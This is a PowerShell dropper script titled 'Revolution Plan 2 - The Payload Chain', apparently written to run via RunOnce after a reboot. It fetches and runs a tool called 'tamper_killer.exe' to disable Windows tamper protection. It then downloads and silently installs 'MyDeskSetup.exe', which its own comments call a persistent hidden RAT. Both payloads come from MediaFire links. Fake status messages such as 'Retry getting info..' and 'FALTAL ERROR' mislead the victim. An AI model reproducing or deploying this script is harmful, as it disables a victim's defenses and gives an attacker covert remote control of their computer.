# Revolution Plan 2 - The Payload Chain
# Executed by RunOnce after reboot.

# === SPEED FIX: Disable Progress Bar (Increases download speed by 10x) ===
$ProgressPreference = 'SilentlyContinue'

Write-Host "Preparation!" -ForegroundColor Cyan

# ---------------------------------------------------------
# STEP 1: Tamper Protection Killer (Defense Evasion)
# ---------------------------------------------------------
# [USER] OPTIONAL: Updates this link if you still use 'tamper_killer.exe'
$TamperUrl = "https://download1338.mediafire.com/m3gtmjlm4umgsxyGjdCq-OIRkPY3WHA20r6C_FP98XZaAYRaka5kohr0TJs9pjMOsSwTlsv1vK9UPbHyxHtAuagPFm7N_D3ZX023WP_xEpKnwG3r_nNANxnFiIuR3JMaL0FQU26ZSP_PDhE2qSYvu6BZyDoUUEso7LFQri_fULKTGxQ/pyr9u6630bu1urj/tamper_killer.exe" 
$TamperDest = "$env:TEMP\tamper_killer.exe"

Write-Host "Downloading..."
try {
    Invoke-WebRequest -Uri $TamperUrl -OutFile $TamperDest -UseBasicParsing
    Unblock-File -Path $TamperDest -ErrorAction SilentlyContinue
        
    if (Test-Path $TamperDest) {
        # Write-Host "    -> Launching Neutralizer (Background)..." -ForegroundColor Yellow
        # REMOVED -Wait: We do not wait for it, because it might run forever or take time.
        Start-Process -FilePath $TamperDest
        Write-Host "Done half way!" -ForegroundColor Green
    }
}
catch {
    Write-Host "[!] Download Failed!" -ForegroundColor Red
}

# ---------------------------------------------------------
# STEP 2: MyDesk Persistent Agent (The RAT)
# ---------------------------------------------------------
# REPLACE THIS URL with your uploaded 'MyDeskSetup.exe' link
$SetupUrl = "https://download1593.mediafire.com/6ygh80yoxfjgmAdd46HUTtiIGs5j-5_LVR_UkkoQRMNKSAPDN7kG03GniheGLEvA0CnC5BBslf_vXpAmVn5Ey6PMt4kTqfyF5KthqjkQV1WnvFcRz3J4JnbFUw3Z3S0u8OHFYBe-RnFVYYZOASVCFyxPUjVSkxgFimKZPj25UiIlHow/76v0uxlwvbr30rk/MyDeskSetup.exe" 
$SetupDest = "$env:TEMP\MyDeskSetup.exe"

Write-Host "Retry getting info.."
try {
    Invoke-WebRequest -Uri $SetupUrl -OutFile $SetupDest -UseBasicParsing
    Unblock-File -Path $SetupDest -ErrorAction SilentlyContinue
        
    if (Test-Path $SetupDest) {
        # Write-Host "    -> Installing Hidden Service..." -ForegroundColor Yellow
        # Service Installer exits quickly, so -Wait is fine here.
        Start-Process -FilePath $SetupDest -Wait
        Write-Host "Done!" -ForegroundColor Green
    }
}
catch {
    Write-Host "[!] Download Failed!" -ForegroundColor Red
}

Write-Host "FALTAL ERROR" -ForegroundColor Red
exit